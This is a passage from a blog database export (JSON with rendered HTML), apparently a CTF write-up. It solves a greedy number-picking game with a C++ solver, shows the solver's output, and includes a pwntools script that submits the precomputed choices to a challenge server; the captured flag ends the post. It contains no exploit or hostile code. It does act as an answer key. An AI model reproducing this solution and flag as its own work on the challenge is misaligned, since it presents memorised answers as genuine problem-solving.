string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Score Difference: \"</span> <span class=\"token operator\">&lt;&lt;</span> myScore <span class=\"token operator\">-</span> opponentScore <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\n\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">solveLevel</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// Level 1</span>\n    <span class=\"token function\">solveLevel</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Level 2</span>\n    <span class=\"token function\">solveLevel</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">76</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Level 3</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>输出：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">Level <span class=\"token number\">50</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> moves<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\nchoices <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36</span><span class=\"token punctuation\">]</span>\nMy Score<span class=\"token operator\">:</span> <span class=\"token number\">718</span>\nOpponent Score<span class=\"token operator\">:</span> <span class=\"token number\">557</span>\nScore Difference<span class=\"token operator\">:</span> <span class=\"token number\">161</span>\n\nLevel <span class=\"token number\">100</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> moves<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\nchoices <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72</span><span class=\"token punctuation\">]</span>\nMy Score<span class=\"token operator\">:</span> <span class=\"token number\">2856</span>\nOpponent Score<span class=\"token operator\">:</span> <span class=\"token number\">2194</span>\nScore Difference<span class=\"token operator\">:</span> <span class=\"token number\">662</span>\n\nLevel <span class=\"token number\">200</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> moves<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\nchoices <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">187</span><span class=\"token punctuation\">,</span> <span class=\"token number\">169</span><span class=\"token punctuation\">,</span> <span class=\"token number\">185</span><span class=\"token punctuation\">,</span> <span class=\"token number\">161</span><span class=\"token punctuation\">,</span> <span class=\"token number\">155</span><span class=\"token punctuation\">,</span> <span class=\"token number\">183</span><span class=\"token punctuation\">,</span> <span class=\"token number\">122</span><span class=\"token punctuation\">,</span> <span class=\"token number\">177</span><span class=\"token punctuation\">,</span> <span class=\"token number\">145</span><span class=\"token punctuation\">,</span> <span class=\"token number\">175</span><span class=\"token punctuation\">,</span> <span class=\"token number\">133</span><span class=\"token punctuation\">,</span> <span class=\"token number\">159</span><span class=\"token punctuation\">,</span> <span class=\"token number\">171</span><span class=\"token punctuation\">,</span> <span class=\"token number\">153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">194</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141</span><span class=\"token punctuation\">,</span> <span class=\"token number\">188</span><span class=\"token punctuation\">,</span> <span class=\"token number\">178</span><span class=\"token punctuation\">,</span> <span class=\"token number\">129</span><span class=\"token punctuation\">,</span> <span class=\"token number\">172</span><span class=\"token punctuation\">,</span> <span class=\"token number\">166</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">164</span><span class=\"token punctuation\">,</span> <span class=\"token number\">158</span><span class=\"token punctuation\">,</span> <span class=\"token number\">117</span><span class=\"token punctuation\">,</span> <span class=\"token number\">195</span><span class=\"token punctuation\">,</span> <span class=\"token number\">130</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189</span><span class=\"token punctuation\">,</span> <span class=\"token number\">147</span><span class=\"token punctuation\">,</span> <span class=\"token number\">135</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">196</span><span class=\"token punctuation\">,</span> <span class=\"token number\">182</span><span class=\"token punctuation\">,</span> <span class=\"token number\">165</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">154</span><span class=\"token punctuation\">,</span> <span class=\"token number\">148</span><span class=\"token punctuation\">,</span> <span class=\"token number\">146</span><span class=\"token punctuation\">,</span> <span class=\"token number\">78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">156</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">,</span> <span class=\"token number\">190</span><span class=\"token punctuation\">,</span> <span class=\"token number\">152</span><span class=\"token punctuation\">,</span> <span class=\"token number\">142</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">170</span><span class=\"token punctuation\">,</span> <span class=\"token number\">136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">134</span><span class=\"token punctuation\">,</span> <span class=\"token number\">126</span><span class=\"token punctuation\">,</span> <span class=\"token number\">124</span><span class=\"token punctuation\">,</span> <span class=\"token number\">186</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">180</span><span class=\"token punctuation\">,</span> <span class=\"token number\">140</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">174</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">160</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span> <span class=\"token number\">168</span><span class=\"token punctuation\">,</span> <span class=\"token number\">108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">162</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">144</span><span class=\"token punctuation\">,</span> <span class=\"token number\">92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">138</span><span class=\"token punctuation\">,</span> <span class=\"token number\">88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">132</span><span class=\"token punctuation\">,</span> <span class=\"token number\">198</span><span class=\"token punctuation\">]</span>\nMy Score<span class=\"token operator\">:</span> <span class=\"token number\">11094</span>\nOpponent Score<span class=\"token operator\">:</span> <span class=\"token number\">9006</span>\nScore Difference<span class=\"token operator\">:</span> <span class=\"token number\">2088</span></code></pre>\n\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nsh<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.94.204.178\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">26629</span> <span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'3.Quit\\n'</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 这边打的时候Level1使用的是之前手动取的值</span>\nnums<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">[</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">[</span><span class=\"token number\">199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">187</span><span class=\"token punctuation\">,</span> <span class=\"token number\">169</span><span class=\"token punctuation\">,</span> <span class=\"token number\">185</span><span class=\"token punctuation\">,</span> <span class=\"token number\">161</span><span class=\"token punctuation\">,</span> <span class=\"token number\">155</span><span class=\"token punctuation\">,</span> <span class=\"token number\">183</span><span class=\"token punctuation\">,</span> <span class=\"token number\">122</span><span class=\"token punctuation\">,</span> <span class=\"token number\">177</span><span class=\"token punctuation\">,</span> <span class=\"token number\">145</span><span class=\"token punctuation\">,</span> <span class=\"token number\">175</span><span class=\"token punctuation\">,</span> <span class=\"token number\">133</span><span class=\"token punctuation\">,</span> <span class=\"token number\">159</span><span class=\"token punctuation\">,</span> <span class=\"token number\">171</span><span class=\"token punctuation\">,</span> <span class=\"token number\">153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">194</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141</span><span class=\"token punctuation\">,</span> <span class=\"token number\">188</span><span class=\"token punctuation\">,</span> <span class=\"token number\">178</span><span class=\"token punctuation\">,</span> <span class=\"token number\">129</span><span class=\"token punctuation\">,</span> <span class=\"token number\">172</span><span class=\"token punctuation\">,</span> <span class=\"token number\">166</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">164</span><span class=\"token punctuation\">,</span> <span class=\"token number\">158</span><span class=\"token punctuation\">,</span> <span class=\"token number\">117</span><span class=\"token punctuation\">,</span> <span class=\"token number\">195</span><span class=\"token punctuation\">,</span> <span class=\"token number\">130</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189</span><span class=\"token punctuation\">,</span> <span class=\"token number\">147</span><span class=\"token punctuation\">,</span> <span class=\"token number\">135</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">196</span><span class=\"token punctuation\">,</span> <span class=\"token number\">182</span><span class=\"token punctuation\">,</span> <span class=\"token number\">165</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">154</span><span class=\"token punctuation\">,</span> <span class=\"token number\">148</span><span class=\"token punctuation\">,</span> <span class=\"token number\">146</span><span class=\"token punctuation\">,</span> <span class=\"token number\">78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">156</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">,</span> <span class=\"token number\">190</span><span class=\"token punctuation\">,</span> <span class=\"token number\">152</span><span class=\"token punctuation\">,</span> <span class=\"token number\">142</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">170</span><span class=\"token punctuation\">,</span> <span class=\"token number\">136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">134</span><span class=\"token punctuation\">,</span> <span class=\"token number\">126</span><span class=\"token punctuation\">,</span> <span class=\"token number\">124</span><span class=\"token punctuation\">,</span> <span class=\"token number\">186</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">180</span><span class=\"token punctuation\">,</span> <span class=\"token number\">140</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">174</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">160</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span> <span class=\"token number\">168</span><span class=\"token punctuation\">,</span> <span class=\"token number\">108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">162</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">144</span><span class=\"token punctuation\">,</span> <span class=\"token number\">92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">138</span><span class=\"token punctuation\">,</span> <span class=\"token number\">88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">132</span><span class=\"token punctuation\">,</span> <span class=\"token number\">198</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> nums<span class=\"token punctuation\">:</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ers\\n'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> num<span class=\"token punctuation\">:</span>\n        sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ber:'</span><span class=\"token punctuation\">)</span>\n        sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>recvlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>b”Congratulations!, Here’s Your Flag flag{Greed, is……key of the life.}\\n”</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cm9r3mmeu000bf0lsbflpcgx8","category_id":"cm9r3mmes0008f0lsbuto69b5","_id":"cm9r3mmew000ef0lsbev8ehu7"},{"post_id":"cm9r3mmep0005f0lscmmufd8y","category_id":"cm9r3mmes0008f0lsbuto69b5","_id":"cm9r3mmew000hf0ls4iopdegf"},{"post_id":"cm9r3mmer0007f0lsgorubwi3","category_id":"cm9r3mmes0008f0lsbuto69b5","_id":"cm9r3mmew000if0ls6st17zhl"},{"post_id":"cm9r3mmet000af0lsgtri6h0f","category_id":"cm9r3mmes0008f0lsbuto69b5","_id":"cm9r3mmew000kf0ls8j0h0wl4"}],"PostTag":[{"post_id":"cm9r3mmep0005f0lscmmufd8y","tag_id":"cm9r3mmet0009f0ls2ivs97wz","_id":"cm9r3mmex000nf0lse4140uh2"},{"post_id":"cm9r3mmep0005f0lscmmufd8y","tag_id":"cm9r3mmev000df0ls75ykaalc","_id":"cm9r3mmex000of0lsd8rm1g3q"},{"post_id":"cm9r3mmep0005f0lscmmufd8y","tag_id":"cm9r3mmew000gf0lsci1c23tz","_id":"cm9r3mmex000qf0ls76d64oub"},{"post_id":"cm9r3mmep0005f0lscmmufd8y","tag_id":"cm9r3mmew000jf0ls8ga822w7","_id":"cm9r3mmex000rf0ls8et639ea"},{"post_id":"cm9r3mmep0005f0lscmmufd8y","tag_id":"cm9r3mmew000lf0ls51o3aukp","_id":"cm9r3mmex000tf0ls5xaafz4m"},{"post_id":"cm9r3mmer0007f0lsgorubwi3","tag_id":"cm9r3mmet0009f0ls2ivs97wz","_id":"cm9r3mmey000xf0lsfp960757"},{"post_id":"cm9r3mmer0007f0lsgorubwi3","tag_id":"cm9r3mmev000df0ls75ykaalc","_id":"cm9r3mmey000yf0ls72fzcech"},{"post_id":"cm9r3mmer0007f0lsgorubwi3","tag_id":"cm9r3mmew000gf0lsci1c23tz","_id":"cm9r3mmey0010f0ls92gncnie"},{"post_id":"cm9r3mmer0007f0lsgorubwi3","tag_id":"cm9r3mmew000jf0ls8ga822w7","_id":"cm9r3mmey0011f0ls4gk056sm"},{"post_id":"cm9r3mmer0007f0lsgorubwi3","tag_id":"cm9r3mmew000lf0ls51o3aukp","_id":"cm9r3mmey0013f0ls8je92c7e"},{"post_id":"cm9r3mmet000af0lsgtri6h0f","tag_id":"cm9r3mmet0009f0ls2ivs97wz","_id":"cm9r3mmey0017f0ls24ae586c"},{"post_id":"cm9r3mmet000af0lsgtri6h0f","tag_id":"cm9r3mmev000df0ls75ykaalc","_id":"cm9r3mmey0018f0lsgeow56z9"},{"post_id":"cm9r3mmet000af0lsgtri6h0f","tag_id":"cm9r3mmew000gf0lsci1c23tz","_id":"cm9r3mmez001af0ls8ajmg3at"},{"post_id":"cm9r3mmet000af0lsgtri6h0f","tag_id":"cm9r3mmew000jf0ls8ga822w7","_id":"cm9r3mmez001bf0ls0bxhb3x8"},{"post_id":"cm9r3mmet000af0lsgtri6h0f","tag_id":"cm9r3mmew000lf0ls51o3aukp","_id":"cm9r3mmez001df0ls30w90tg6"},{"post_id":"cm9r3mmeu000bf0lsbflpcgx8","tag_id":"cm9r3mmet0009f0ls2ivs97wz","_id":"cm9r3mmez001ff0lseb9max0z"},{"post_id":"cm9r3mmeu000bf0lsbflpcgx8","tag_id":"cm9r3mmev000df0ls75ykaalc","_id":"cm9r3mmez001gf0ls1z372ksa"},{"post_id":"cm9r3mmeu000bf0lsbflpcgx8","tag_id":"cm9r3mmew000gf0lsci1c23tz","_id":"cm9r3mmez001hf0ls3eze89gn"},{"post_id":"cm9r3mmeu000bf0lsbflpcgx8","tag_id":"cm9r3mmew000jf0ls8ga822w7","_id":"cm9r3mmez001if0lsh2bperkq"},{"post_id":"cm9r3mmeu000bf0lsbflpcgx8","tag_id":"cm9r3mmew000lf0ls51o3aukp","_id":"cm9r3mmez001jf0ls2j0faun8"}],"Tag":[{"name":"cry","_id":"cm9r3mmet0009f0ls2ivs97wz"},{"name":"web","_id":"cm9r3mmev000df0ls75ykaalc"},{"name":"re","_id":"cm9r3mmew000gf0lsci1c23tz"},{"name":"pwn","_id":"cm9r3mmew000jf0ls8ga822w7"},{"name":"misc","_id":"cm9r3mmew000lf0ls51o3aukp"}]}}